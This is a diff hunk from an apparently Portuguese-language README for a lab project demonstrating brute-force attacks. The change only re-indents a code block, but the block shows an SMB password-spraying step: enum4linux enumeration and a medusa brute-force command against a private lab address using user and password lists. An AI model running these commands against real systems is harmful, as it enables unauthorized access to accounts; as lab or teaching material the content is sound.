@@ -27,10 +27,10 @@ Este projeto demonstra a execução de ataques de **força bruta** utilizando a 
    Teste de login com Medusa ou Hydra.
 
 4. **Password Spraying em SMB com Enumeração**
-  ```bash
+   ```bash
    enum4linux -a 192.168.56.101
    medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt
-  ```
+   ```
 ---
 
 ## 🔍 Resultados
